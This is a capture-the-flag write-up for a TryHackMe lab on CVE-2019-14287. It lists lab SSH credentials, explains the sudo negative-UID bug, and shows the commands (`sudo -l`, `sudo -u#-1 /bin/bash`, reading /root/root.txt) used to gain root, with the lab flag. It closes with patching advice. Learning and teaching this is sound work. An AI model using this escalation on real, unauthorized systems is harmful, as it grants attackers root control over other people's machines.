# Sudo Security Bypass

<img width="1903" height="360" alt="image" src="https://github.com/user-attachments/assets/d726c013-29f8-4661-9262-0ff84a5c9b48" />


---

>[!important]
> ## To connect to machine :
> ### **`ssh`**
> 
> ```ruby
> ssh -p 2222 tryhackme@10.10.46.156
> ```
>
> ### **`putty`**
>
> You put the IP, port, and username in it.
>
> After that, it will ask you for the password.
>
> ```ruby
> tryhackme : tryhackme
> ```


---
---


<img width="1015" height="238" alt="image" src="https://github.com/user-attachments/assets/1b9f08c1-75bc-4ca4-bf49-64d29f431c5d" />










CVE-2019-14287 --- short summary
==============================

-   **Vulnerability:** In certain old `sudo` versions (< **1.8.28**), supplying a negative UID (e.g. `-1`) or its unsigned equivalent (`4294967295`) to `sudo -u#<uid>` could be misinterpreted so that the process is executed as **UID 0 (root)** despite sudoers rules explicitly forbidding use of root (for example `(ALL:!root)`).

-   **Impact:** A user who is allowed to run commands as *any* non-root user (but explicitly *not* root) could still escalate to root by using `-1` (or `4294967295`) with `sudo -u#-1`.

* * * * *

Why this happens (technical root cause)
=======================================

-   The bug arises from **signed/unsigned integer handling / wraparound** inside `sudo`'s codepath when converting or checking the provided UID.

-   `-1` in signed 32-bit becomes `0xFFFFFFFF` when interpreted as **unsigned** (which is `4294967295`). Internal comparisons or casts could then incorrectly treat that value as UID `0` (root) or otherwise bypass the check that denies root.

-   Because the sudoers policy allowed running commands as **any user except root** (e.g. `(ALL, !root)`), the negative UID trick bypasses the `!root` restriction and runs the target command as root.

* * * * *

my first attempts failed
==============================

-   I tried `sudo -u#-1 id` and `sudo -u#-1 cat /root/root.txt` and got "not allowed" errors. That failed because:

    -   The `sudoers` entry for your account **only allowed `/bin/bash`** (see `sudo -l` output). You were **not allowed** to run arbitrary commands via sudo --- only `/bin/bash` was permitted.

    -   So trying to run `/usr/bin/id` or `/bin/cat` was blocked by the sudoers whitelist, regardless of the UID trick.

-   Once you ran the allowed binary (`/bin/bash`) with the special UID, the exploit succeeded.

* * * * *

Exact steps you ran (what they do) --- with explanations
======================================================

1.  **Check sudo version**

    ```
    sudo --version

    ```

    -   You saw `Sudo version 1.8.21p2`.

    -   This version is **vulnerable** (it is older than 1.8.28).

2.  **List allowed sudo commands for your user**

    ```
    sudo -l

    ```

    -   Output showed:

        ```
        (ALL, !root) NOPASSWD: /bin/bash

        ```

    -   Meaning: you may run `/bin/bash` as any user except root, and without password.

3.  **Exploit the vulnerability by executing the permitted command as UID -1**

    ```
    sudo -u#-1 /bin/bash

    ```

    -   `-u#-1` tells sudo "run the command as numeric UID -1".

    -   Because of the bug, sudo interpreted that numeric UID in a way that resulted in a **root** effective UID for the spawned shell.

4.  **Verify you are root**

    ```
    whoami
    id

    ```

    -   `whoami` returned `root`.

    -   `id` showed `uid=0(root) gid=1000(tryhackme) groups=1000(tryhackme)`.

        -   This indicates the **effective UID** is 0 (root). The GID remained 1000 (tryhackme) in this shell---root privileges are already present (EUID 0), so you have full control even if the primary group is original user's group.

5.  **Read the root flag**

    ```
    cat /root/root.txt

    ```

    -   The file printed `THM{l33t_s3cur1ty_bypass}` --- proof you had root access.

* * * * *

Why EUID=0 but GID stayed as tryhackme?
=======================================

-   When you spawn a shell via `sudo` the process can end up with **effective UID = 0** but retain the previous primary group ID (GID) depending on how `sudo` set uid/gid in that codepath.

-   Despite the GID, having `EUID=0` means the shell runs with root privileges and can perform privileged actions. The GID alone does not prevent root actions.

* * * * *

How to fix / mitigate the vulnerability
=======================================

-   **Upgrade `sudo`** to version **1.8.28** or later (this issue was fixed in 1.8.28).

-   Avoid relying solely on ACL patterns that use `(ALL, !root)` without careful auditing. Be explicit about allowed commands and use minimal privileges.

-   Apply system updates and security patches on servers regularly.

* * * * *

Responsible use & final notes
=============================

-   This exploit is valid **only** for vulnerable sudo versions and only when the sudoers configuration grants non-root `sudo` for commands in a way that the negative UID trick can be applied.

-   Use this knowledge only in authorized testing environments (like your TryHackMe machine) or with explicit permission. Unauthorized use on real systems is illegal.

* * * * *










<img width="1192" height="494" alt="image" src="https://github.com/user-attachments/assets/31dbc8fc-43cd-4121-b380-8d71ce594167" />





































